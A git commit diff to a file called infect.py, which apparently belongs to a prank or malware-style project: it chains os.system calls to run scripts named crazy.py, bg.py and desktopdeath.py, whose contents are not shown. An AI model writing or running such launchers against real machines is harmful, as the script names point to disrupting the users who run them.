90b5169c56120d0e0106961ac167e12a92c7185d
BenPI88 <97198967+BenPI88@users.noreply.github.com>
2022-08-14 17:12:59 -0500

    Update infect.py

--- infect.py
+++ infect.py
@@ -1,7 +1,2 @@
 import os
-os.system("python3 crazy.py")
-import time
-time.sleep(60)
-os.system("python3 bg.py")
-time.sleep(60)
-os.system("python3 desktopdeath.py")
+os.system("python3 crazy.py && python3 bg.py && python3 desktopdeath.py")
